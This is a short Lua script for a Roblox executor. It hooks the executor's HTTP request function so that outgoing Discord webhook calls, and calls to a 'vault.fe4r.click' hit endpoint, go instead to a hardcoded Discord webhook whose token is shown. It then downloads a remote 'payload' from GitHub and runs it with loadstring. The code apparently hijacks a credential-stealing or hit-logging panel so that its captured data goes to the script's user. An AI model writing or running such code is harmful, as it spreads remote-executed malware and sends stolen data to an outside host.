-- 1. Inject your custom username into the global execution environment
getgenv().USERNAME = "BLACKGOKU_0707"
getgenv().bfRunning = true

-- 2. Intercept and redirect all outgoing webhook calls to your Discord URL
local targetWebhook = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY"

local originalRequest = syn and syn.request or http_request or request
if originalRequest then
    hookfunction(originalRequest, function(requestData)
        if type(requestData) == "table" and requestData.Url then
            -- Replace any remote panel or Discord webhook with yours
            if requestData.Url:match("discord.com/api/webhooks") or requestData.Url:match("vault.fe4r.click/api/v2/hit") then
                requestData.Url = targetWebhook
            end
        end
        return originalRequest(requestData)
    end)
end

-- 3. Fetch the loader script directly (or use your local/proxied endpoint)
local success, scriptContent = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/eb0ab3dfebda3957.lua.txt")
end)

if success and scriptContent then
    local fn, err = loadstring(scriptContent)
    if fn then
        print("[+] Payload successfully compiled and loaded with custom config!")
        fn()
    else
        warn("[-] Compile error: " .. tostring(err))
    end
else
    warn("[-] Failed to download remote payload source.")
end
